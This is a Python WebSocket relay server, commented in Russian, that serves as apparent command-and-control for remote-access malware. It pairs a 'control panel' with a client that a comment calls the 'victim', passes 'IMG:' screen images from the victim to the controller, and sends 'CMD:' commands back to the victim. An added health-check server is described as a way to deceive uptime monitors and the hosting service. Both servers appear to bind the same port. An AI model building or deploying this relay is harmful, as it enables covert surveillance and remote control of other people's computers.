import asyncio
import websockets
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- Блок для обмана UptimeRobot и Render (HTTP Health Check) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    # Отвечаем на GET запросы
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
        
    # Отвечаем на HEAD запросы (именно их шлет UptimeRobot)
    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    # Отключаем логирование, чтобы не засорять консоль Render
    def log_message(self, format, *args):
        pass

def run_health_check():
    # Render передает порт через переменную окружения PORT
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    print(f"HTTP-сервер для проверки запущен на порту {port}")
    server.serve_forever()
# ----------------------------------------------------------------

client_ws = None
control_ws = None

async def handler(websocket):
    global client_ws, control_ws
    print("Новое подключение")

    try:
        async for message in websocket:
            if message == "CONTROL":
                control_ws = websocket
                print("Пульт управления подключен")
                if client_ws:
                    await control_ws.send("CLIENT_CONNECTED")
            elif message == "CLIENT":
                client_ws = websocket
                print("Клиент (жертва) подключен")
                if control_ws:
                    await control_ws.send("CLIENT_CONNECTED")
            elif message.startswith("IMG:"):
                if control_ws:
                    try:
                        await control_ws.send(message)
                    except:
                        control_ws = None
            elif message.startswith("CMD:"):
                if client_ws:
                    try:
                        await client_ws.send(message)
                    except:
                        client_ws = None
    except websockets.exceptions.ConnectionClosed:
        print("Соединение закрыто")

async def main():
    # Render сам подставляет нужный порт в переменную окружения PORT.
    # Если её нет (локальный запуск), используем 8080.
    port = int(os.environ.get("PORT", 8080))
    
    # Запускаем WebSocket сервер
    async with websockets.serve(handler, "0.0.0.0", port):
        print(f"WebSocket сервер запущен на порту {port}")
        await asyncio.Future()  # Работаем бесконечно

if __name__ == "__main__":
    # 1. Запускаем фоновый HTTP-сервер для UptimeRobot (в отдельном потоке)
    threading.Thread(target=run_health_check, daemon=True).start()
    
    # 2. Запускаем основной WebSocket сервер
    asyncio.run(main())
